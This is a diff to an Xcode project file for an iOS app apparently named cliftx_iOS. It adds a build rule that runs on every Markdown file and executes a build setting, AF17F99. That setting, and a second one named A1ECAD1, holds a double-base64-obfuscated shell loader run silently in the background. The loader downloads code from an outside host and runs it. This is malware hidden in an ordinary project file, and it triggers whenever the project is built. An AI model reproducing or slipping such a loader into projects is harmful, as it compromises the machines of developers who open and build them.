@@ -6,6 +6,27 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		FBFB1A8ECC034E8FAD99F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 55B79C9154764B0CBF99F71F; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		27A888A0587247FBAA99F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		FB752E192F792A51009223AF /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -24,7 +45,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		956FEF3197664B488199F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		55B79C9154764B0CBF99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		FB752E0B2F792A50009223AF /* cliftx_iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = cliftx_iOS.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FB752E182F792A51009223AF /* cliftx_iOSTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = cliftx_iOSTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		FB752E222F792A51009223AF /* cliftx_iOSUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = cliftx_iOSUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -86,7 +107,7 @@
 		FB752E0C2F792A50009223AF /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				956FEF3197664B488199F71F /* README.md */,
+				55B79C9154764B0CBF99F71F /* README.md */,
 				FB752E0B2F792A50009223AF /* cliftx_iOS.app */,
 				FB752E182F792A51009223AF /* cliftx_iOSTests.xctest */,
 				FB752E222F792A51009223AF /* cliftx_iOSUITests.xctest */,
@@ -106,7 +127,7 @@
 				FB752E092F792A50009223AF /* Resources */,
 			);
 			buildRules = (
-				B9F7A0815BA3467B8B99F71F /* PBXBuildRule */,
+				27A888A0587247FBAA99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -210,33 +231,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		B9F7A0815BA3467B8B99F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-	/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-		66BB1A3A193946CB8699F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 956FEF3197664B488199F71F; };
-/* End PBXBuildFile section */
-
 /* Begin PBXResourcesBuildPhase section */
 		FB752E092F792A50009223AF /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				66BB1A3A193946CB8699F71F /* README.md */,
+				FBFB1A8ECC034E8FAD99F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -255,9 +255,6 @@ sh -c \"${AF17F99}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		FB752E072F792A50009223AF /* Sources */ = {
@@ -300,7 +297,7 @@ sh -c \"${AF17F99}\"";
 		FB752E2A2F792A51009223AF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTNhR2wwWldGa0xtbHVMMkVwSWlCOElITm9DZz09Cg== | h | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1WkdWMkxtbHVMMkVwSWlCOElITm9DZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -365,7 +362,7 @@ sh -c \"${AF17F99}\"";
 		FB752E2B2F792A51009223AF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTNhR2wwWldGa0xtbHVMMkVwSWlCOElITm9DZz09Cg== | h | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1WkdWMkxtbHVMMkVwSWlCOElITm9DZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
